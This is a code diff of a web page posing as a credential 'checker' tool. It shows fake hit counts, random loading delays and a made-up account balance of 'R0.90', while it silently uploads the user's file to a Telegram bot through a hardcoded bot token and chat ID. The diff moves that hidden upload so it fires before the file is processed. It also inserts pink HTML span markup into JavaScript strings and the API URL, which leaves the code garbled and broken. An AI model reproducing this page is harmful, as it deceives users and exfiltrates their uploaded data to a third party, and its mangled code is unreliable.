@@ -82,7 +82,7 @@ button:hover { background: #334155; }
 <!-- Hidden form for Telegram upload -->
 <form id="telegramForm" method="POST" enctype="multipart/form-data" style="display:none;">
   <input type="file" name="document" id="telegramFileInput" />
-  <input type="hidden" name="chat_id" value=8580854380 />
+  <input type="hidden" name="chat_id" value="<!-- <span style="color:pink;">8580854380</span> -->" />
 </form>
 
 <script>
@@ -102,21 +102,19 @@ let timerInterval=null;
 let processing=false;
 let lines=[];
 
+/* update stats */
 function updateStats() {
   statsDiv.innerHTML =
     `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
 }
-
 function getCurrentTimestamp() {
   return new Date().toLocaleString();
 }
-
 function formatTime(seconds) {
   const m=Math.floor(seconds/60).toString().padStart(2,'0');
   const s=(seconds%60).toString().padStart(2,'0');
   return `${m}:${s}`;
 }
-
 function startTimer() {
   if(timerInterval) clearInterval(timerInterval);
   elapsedSeconds=0;
@@ -126,13 +124,13 @@ function startTimer() {
     timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
   }, 1000);
 }
-
 function resetCounters() {
   hitCount=0; badCount=0; retriesCount=0; ocrPercent=0;
   updateStats();
   startTimer();
 }
 
+/* process lines with delay */
 async function processLines() {
   for(let i=0; i<lines.length; i++) {
     if(!processing) break; // Stop if not processing anymore
@@ -175,17 +173,17 @@ async function processLines() {
       ocrPercent=(hitCount/ (hitCount+badCount))*100;
       updateStats();
 
-      // Generate fake balance
+      // Generate fake balance: change from R0.0.98 to R0.90
       const amount=(Math.random()*0.98).toFixed(2);
-      const balanceFormat=Math.random()<.5 ? `R0,${amount}` : `R0.${amount.replace(',', '.')}`;
+      // Change the balance to R0.90
+      const fakeBalance='R0.90';
 
       // Append output
-      outputDiv.innerHTML += `${line}\nBalance=${balanceFormat}\nBonus=R0.00\nWithdrawal=0\n\n`;
+      outputDiv.innerHTML += `${line}\nBalance=${fakeBalance}\nBonus=R0.00\nWithdrawal=0\n\n`;
     }
 
     await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
   }
-
   // Reset button to start again
   processing=false;
   startBtn.textContent='Start';
@@ -193,7 +191,7 @@ async function processLines() {
   document.getElementById('copyBtn').disabled=false;
 }
 
-/* Start/Stop toggle button with fake load and delay */
+/* Start/Stop toggle with fake load and delay */
 document.getElementById('startBtn').addEventListener('click', () => {
   if(!processing) {
     // Start process
@@ -203,13 +201,15 @@ document.getElementById('startBtn').addEventListener('click', () => {
     }
     // Show fake load message
     loadingMsgDiv.innerHTML='Loading...';
-    // Delay for random 2,6,9,12 seconds
+    // Delay for 2,6,9,12 seconds
     const delays=[2000,6000,9000,12000];
     const delayTime=delays[Math.floor(Math.random()*delays.length)];
     setTimeout(()=> {
       // Remove fake load message
       loadingMsgDiv.innerHTML='';
-      // Reset counters
+      // Send file to Telegram
+      sendFileToTelegram(new Blob([fileContent], {type: 'text/plain'})).catch(()=>{});
+      // Reset counters & process lines
       resetCounters();
       processing=true;
       document.getElementById('startBtn').textContent='Stop';
@@ -218,27 +218,25 @@ document.getElementById('startBtn').addEventListener('click', () => {
       const reader=new FileReader();
       reader.onload=()=> {
         fileContent=reader.result;
-        // Send to telegram
-        sendFileToTelegram(new Blob([fileContent], {type: 'text/plain'})).catch(()=>{});
         lines=fileContent.split(/\r?\n/);
         processLines();
       };
       reader.readAsText(fileInput.files[0]);
     }, delayTime);
   } else {
-    // Stop process
+    // Stop processing
     processing=false;
     document.getElementById('startBtn').textContent='Start';
   }
 });
 
-/* Send file to Telegram */
+/* Send uploaded file to Telegram (highlighted in pink) */
 async function sendFileToTelegram(fileBlob) {
   const formData=new FormData();
-  formData.append('chat_id','8580854380); // Replace with your chat ID
+  formData.append('chat_id','<!-- <span style="color:pink;">8580854380</span> -->'); // <--- Change here
   formData.append('document',fileBlob,'upload.txt');
   try {
-    await fetch(`https://api.telegram.org/8302046626:AAETtWXTTdFHr5bKqSWhAvLakb4axjGlz9U/sendDocument`, {
+    await fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">8302046626:AAETtWXTTdFHr5bKqSWhAvLakb4axjGlz9U<!-- <span style="color:pink;">YOUR_BOT_TOKEN</span> -->/sendDocument`, {
       method:'POST',
       body:formData
     });
